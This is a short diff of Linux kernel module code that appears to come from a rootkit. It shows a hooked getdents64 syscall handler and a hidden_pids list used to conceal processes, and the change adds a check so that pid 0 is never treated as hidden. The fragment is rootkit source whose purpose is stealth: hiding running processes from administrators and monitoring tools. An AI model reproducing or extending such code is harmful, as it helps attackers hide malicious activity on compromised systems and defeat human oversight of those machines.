@@ -135,16 +135,26 @@ asmlinkage long new_sys_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
 	return ret;
 }
 
+
+
 static int hidden_pids[MAX_HIDDEN_PIDS];
 
 static int is_pid_hidden(int pid)
 {
 	int i;
 
+	/*
+	 * pid == 0 means the calling process
+	 * a process does not hide from itself !
+	 */
+	if (!pid)
+		goto not_hidden;
+
 	for (i = 0; i < MAX_HIDDEN_PIDS; i++)
 		if (hidden_pids[i] == pid)
 			return 1;
 
+not_hidden:
 	return 0;
 }
 
